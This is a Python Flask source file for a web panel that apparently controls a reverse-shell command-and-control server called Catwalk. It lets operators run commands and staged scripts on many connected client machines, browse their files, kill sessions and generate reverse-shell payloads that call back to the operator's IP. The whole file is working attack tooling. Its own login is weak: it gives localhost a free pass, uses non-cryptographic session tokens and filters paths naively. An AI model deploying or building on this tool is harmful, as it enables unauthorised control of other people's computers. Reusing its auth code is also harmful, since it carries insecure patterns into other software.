import random, argparse
import logging as pylogging
from flask_socketio import SocketIO
from flask import Flask
import threading
from flask import *
from core.server import shellServer
import random, json, base64, os, bcrypt
from core.printl import *
from core.plugin import CatwalkPlugins, CatwalkManagers

app = Flask(__name__)
sktio = SocketIO(app)
allowed = []

def getOuis(shell):
    """
    i am so fed up of js and their includes n shit so im just gonna mkae this
    """
    def genRandColor(): return "rgb({},{},{})".format(random.randint(0, 128),random.randint(0, 128),random.randint(0, 128))

    data = {
        "labels": [],
        "datasets": [{
            "data": [],
            "backgroundColor": [],
            "borderWidth": 1,
            "borderColor": 'transparent'
        }]
    }
    ouis = {}

    if len(shell.info) == 0:
        return data

    for client in shell.info:
        oui = shell.info[client]["oui"]
        
        if oui not in ouis:
            ouis[oui] = 1
            if oui not in ouiColors:
                ouiColors[oui] = genRandColor()
        else:
            ouis[oui] += 1

    for i in ouis:
        data["labels"].append(i)
        data["datasets"][0]["data"].append(ouis[i])
        data["datasets"][0]["backgroundColor"].append(ouiColors[i])
        
    return data

def isAllowed(request):
    global allowed
    if request.cookies.get("Authentication", "0") in allowed:
        return True
    else:
        if request.remote_addr == "127.0.0.1":
            return True # its localhost, if its not you they already have access to ur machine so its whatever
        return False

@app.route("/")
def index():
    if not isAllowed(request): return redirect(url_for('login'), code=302)

    return open("./core/http/index.html", "r").read()

@app.route("/login")
def login():
    return open("./core/http/login.html", "r").read()

@app.route("/plugin")
def ppage():
    return open("./core/http/plugin.html", "r").read()

@app.route("/api/login", methods=["POST"])
def loginAPI():
    a = request.get_json(force=True)

    loginData = json.loads(open("config.json", "r").read())["login"]
    if a.get("user", False) == loginData["username"]:

        pw = a.get("pass", "False").encode('ascii')
        hash = loginData["hash"].encode('ascii')

        if bcrypt.checkpw(pw, hash):
            # v # not cryptographically safe but its whatever
            token = ''.join([random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") for _ in range(256)])

            resp = make_response("success")
            resp.set_cookie('Authentication', token)

            allowed.append(token)

            warn("[LOGIN] successful login from {}".format(request.remote_addr))

            return resp

        # v # is it the username? the password? you will never know
        else:
            warn("[LOGIN] unsuccessful login from {}".format(request.remote_addr))
            return "failed"
    else:
        warn("[LOGIN] unsuccessful login from {}".format(request.remote_addr))
        return "failed"

@app.route("/shell")
def shellhtml():
    if not isAllowed(request): return redirect(url_for('login'), code=302)
    return open("./core/http/shell.html", "r").read()

@app.route("/api/data/clients")
def clientData():
    if not isAllowed(request): return {"failure": "login"}

    a = shell.info.copy()
    a.update({"ouis": getOuis(shell)})
    return a

@app.route("/api/data/plugins")
def availablePlugins():
    if not isAllowed(request): return {"failure": "login"}

    return pluginData

@app.route("/api/data/host")
def hostData():
    if not isAllowed(request): return {"failure": "login"}
    return {
        "ip": args.ip,
        "upload": "11194",
        "modules": shell.listeners
    }

@app.route("/api/shell/run", methods=["POST"])
def runcmd():
    if not isAllowed(request): return {"failure": "login"}
    a = request.get_json(force=True)

    if a["command"].split(" ")[0] in ["curl"]:
        a["command"] += ";echo 0"

    if type(a["uid"]) != list:
        dta = shell.runCommand(a["uid"], a["command"], _async=a.get("async", False))
    else:
        for x in a["uid"]:
            shell.runCommand(x, a["command"], _async=True)
        
        info("executed command \"{}\" on {} hosts".format(a["command"], len(a["uid"])))
        return "executed command \"{}\" on {} hosts".format(a["command"], len(a["uid"]))

    if type(dta) == str:
        print(dta)
        return dta
    else:
        return "ok"

@app.route("/api/shell/stage", methods=["POST"])
def runstage():
    if not isAllowed(request): return {"failure": "login"}
    a = request.get_json(force=True)
    stage = a["stage"]

    if type(a["uid"]) != list:
        dta = shell.runStage(a["uid"], stage)
    else:
        for x in a["uid"]:
            shell.runStage(x, stage)
        
        info("executed stage \"{}\" on {} hosts".format(a["stage"], len(a["uid"])))
        return "executed stage \"{}\" on {} hosts".format(a["stage"], len(a["uid"]))

    return dta

@app.route("/api/shell/get_stages", methods=["GET"])
def get_stages():
    if not isAllowed(request): return {"failure": "login"}

    stagesDict = {}

    stages = [x for x in os.listdir("./stages") if ".stage" in x]
    for x in stages:
        description = ""
        recordingDesc = False
        with open("./stages/{}".format(x), "r") as f:
            data = f.read().split("\n")

            # shitily extract the description from the stage file
            for ln in data:
                if ln == '"""':
                    recordingDesc = not recordingDesc
                    if recordingDesc == False:
                        break
                    continue

                if recordingDesc:
                    description += ln + "\n"

        if len(description) == 0: description = "No description provided."

        stagesDict[x] = {"description": description}
                
    return stagesDict

@app.route("/api/shell/ls", methods=["POST"])
def ls():
    """TODO: clean this function up"""

    if not isAllowed(request): return {"failure": "login"}
    a = request.get_json(force=True)

    directory = {}
    windows = shell.info[a["uid"]]["os"] == "Windows"
    shtype = shell.info[a["uid"]]["shelltype"]
    pwd = a.get("pwd", None)
    files = False
    command = ""

    if pwd == None:
        if shtype == "command prompt":
            pwd = shell.runCommand(a["uid"], "echo %cd%")
        else:
            pwd = shell.runCommand(a["uid"], "pwd")
            if shtype == "powershell":
                print(pwd.split("\n"))
                pwd = pwd.split("\n")[2]

    if "dbg" in pwd:
        return {"pwd": "/home", "directory": {}}
    
    if windows:
        pwd = pwd.replace("/", "\\") # windows doesn't like forwardslashes
        command += "dir"

        if pwd != None or pwd != "current":
            command += ' "'+pwd+'"'
    else:
        pwd = pwd.replace("\\", "/") # linux doesn't like backslashes
        command = "ls -la | awk '{printf \"%s |y1| \", $0}';" # because ptys are wonky...

        if pwd != None or pwd != "current":
            command = "ls -la \""+pwd+"\" | awk '{printf \"%s |y1| \", $0}';" # because ptys are wonky 2...

    print(command)

    dta = shell.runCommand(a["uid"], command)

    if "Directory: " in dta:
        windows = True
    
    print("ls: {}".format(dta))

    if not windows:
        dta = dta.replace("|y1|", "\n")

    for x in dta.split("\n"):
        if len(x) == 0: continue
        if windows:
            if shtype == "powershell":
                if "Directory: " in x:
                    pwd = x.split("Directory:", 1)[-1].strip()
                else:
                    if x.split(" ")[0] == "----": files = True; continue

                    if files:
                        b = [z for z in x]
                        b.pop(0)
                        if "." in ''.join(b):
                            directory[x.strip().split(" ")[-1]] = "file"
                        else:
                            directory[x.strip().split(" ")[-1]] = "folder"
            else:
                if "Directory of " in x:
                    pwd = x.split("Directory of ", 1)[-1].strip()
                else:
                    if x[0] == " ": continue
                    if x[0] in [x for x in "0123456789"]: files = True;

                    if files:
                        nm = x[39:]
                        
                        if "File(s)" in x:
                            files = False
                            continue

                        if "<DIR>" in x:
                            if nm.strip() == "." or nm.strip() == "..": continue
                            directory[nm.strip()] = "folder"
                        else:
                            directory[nm.strip()] = "file"
                
        else: # unix
            print(x.strip())
            if x.strip()[0] == "d":
                if (x.strip().split(" ")[-1])[-1] == ".":
                    continue
                directory[x.strip().split(" ")[-1]] = "folder"
            elif x.strip()[0] == "-":
                directory[x.strip().split(" ")[-1]] = "file"


    return {"pwd": pwd, "directory": directory}

@app.route("/api/shell/delete", methods=["POST"])
def delete():
    if not isAllowed(request): return {"failure": "login"}
    a = request.get_json(force=True)

    if type(a["uid"]) != list:
        shell.killUID(a["uid"])

    else:
        for x in a["uid"]:
            info('blacklisted child {}, since we can\'t delete'.format(x))
            shell.killUID(x)

        return "killed {} hosts".format(len(a["uid"]))

    return "ok"

# payload generation
@app.route("/api/generate/hoaxshell", methods=["POST"])
def hoaxshellPLGen():
    """DEPRECIATED"""
    if not isAllowed(request): return {"failure": "login"}
    a = request.get_json(force=True)
    
    return "None"

@app.route("/api/host/dbg", methods=["POST"])
def opendbg():
    global dbgCount
    if not isAllowed(request): return {"failure": "login"}
    a = request.get_json(force=True)

    if int(a["count"]) >= 5:
        a["count"] = "5"

    dbgCount += 1

    if dbgCount == 5: return "ok"

    threading.Thread(target=runDBG, args=(a["count"],), daemon=True).start()

    return "ok"

@app.route("/api/generate/payload", methods=["POST"])
def normalPLGen():
    if not isAllowed(request): return {"failure": "login"}
    a = request.get_json(force=True)

    payloads = json.loads(open("./core/payloads.json", "r").read())

    # check if payload is in json file
    if a["payload"] not in list(payloads):
        return "invalid payload"
    else:
        b = payloads[a["payload"]]
        b["command"] = (base64.b64decode(b["command"].encode('ascii')).decode('ascii')).replace("{ip}", args.ip).replace("{port}", "7763").replace("{shell}", a.get("shell", "bash")) # LOTTA SPLICING AND COULD'VE PROBABLY BEEN DONE WITH REGEX BUT WHO CARES
            
        return b
    
@app.route("/api/generate/list", methods=["GET"])
def getPayloads():
    if not isAllowed(request): return {"failure": "login"}
    payloads = []

    payloads += list(json.loads(open("./core/payloads.json", "r").read())) # normal payloads

    return {"payloads": payloads}

@app.route("/api/generate/message", methods=["GET"])
def randMessage():
    if not isAllowed(request): return {"failure": "login"}
    """
    just a tiny little function to add a changing motd
    """
    msgs = [
        "waka waka"
    ]

    return random.choice(msgs)

@app.route('/favicon.ico')
def favicon():
    return send_from_directory('./core/http/icons', 'catwalk.ico',mimetype='image/vnd.microsoft.icon')

@app.route('/core/<path:req_path>')
def coreDir(req_path):
    if not isAllowed(request): return redirect(url_for('login'), code=302)
    BASE_DIR = './core/http/'

    # Joining the base and the requested path
    abs_path = os.path.join(BASE_DIR, req_path.replace("/..", ""))

    # Return 404 if path doesn't exist
    if not os.path.exists(abs_path):
        return abort(404)

    # Check if path is a file and serve
    if os.path.isfile(abs_path):
        return send_file(abs_path)
    else:
        return abort(404)
    
def runDBG(count):
    os.system("python3 ./debug/clients/fakeclient.py 7763 {}".format(count))

# init required servers
if __name__ == "__main__":

    # init flask, and flask plugins

    mgrs = CatwalkManagers()
    wsock = None

    flasklog = pylogging.getLogger('werkzeug')
    flasklog.setLevel(pylogging.ERROR)

    for _, manager in mgrs.modules.items():
        mgrs.run(manager["module"], "startServer", sktio)

    # init args
    parser = argparse.ArgumentParser()

    parser.add_argument("--port", "-p",
                        help="port")

    parser.add_argument("ip",
                        help="IP address to bind to.")

    args = parser.parse_args()

    # variables
    port = int(args.port) if args.port != None else random.randint(17000, 25535)
    ip = args.ip # for easier, future refrences

    shell = shellServer(mgrs, sktio)
    ouiColors = {}
    pluginData = {}
    dbgCount = 0

    print("-" * 30)
    webPlugins = CatwalkPlugins()

    for name, plug in webPlugins.modules.items():
        bp = webPlugins.getvar(plug["module"], "blueprint")
        pname = webPlugins.getvar(plug["module"], "name")
        pdesc = webPlugins.getvar(plug["module"], "description")
        mainEP = webPlugins.getvar(plug["module"], "mainpage")
        buttons = webPlugins.getvar(plug["module"], "customButtons")

        if mainEP[0] != '/':
            mainEP = '/'+mainEP

        pluginData[pname] = {"endpoint": mainEP, "desc": pdesc, "buttons": buttons}

        app.register_blueprint(bp, url_prefix="/plugins")

    sktio.run(app, host="0.0.0.0", port=80, debug=False)